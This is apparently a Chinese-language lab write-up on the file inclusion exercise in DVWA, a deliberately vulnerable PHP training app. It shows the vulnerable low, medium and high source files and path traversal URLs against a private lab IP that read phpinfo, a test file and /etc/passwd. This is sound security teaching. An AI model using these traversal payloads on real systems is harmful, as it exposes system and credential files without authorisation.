#dvwacn之九文件包含

dvwacn之文件包含物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/fi/source# ls
high.php  low.php  medium.php
```


##安全级别

- low.php

```
<?php

	$file = $_GET['page']; //The page we wish to display 

?>

```

- medium.php 

```
<?php

	$file = $_GET['page']; // The page we wish to display 

	// Bad input validation
	$file = str_replace("http://", "", $file);
	$file = str_replace("https://", "", $file);		


?>
```


- high.php

``` 
<?php
		
	$file = $_GET['page']; //The page we wish to display 

	// Only allow include.php
	if ( $file != "include.php" ) {
		echo "´: τ¼þδ֒µ½£¡";
		exit;
	}
		
?>
```

##包含phpinfo.php文件

http://192.168.56.80/dvwacn/vulnerabilities/fi/?page=../../phpinfo.php

页面将返回phpinfo信息

##包含include.txt

http://192.168.56.80/dvwacn/vulnerabilities/fi/?page=../../include.txt

页面返回

```
here is file inclution test!!!!!! code is excute here
```

##包含/etc/passwd文件

http://192.168.56.80/dvwacn/vulnerabilities/fi/?page=../../../../../etc/passwd

页面返回

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```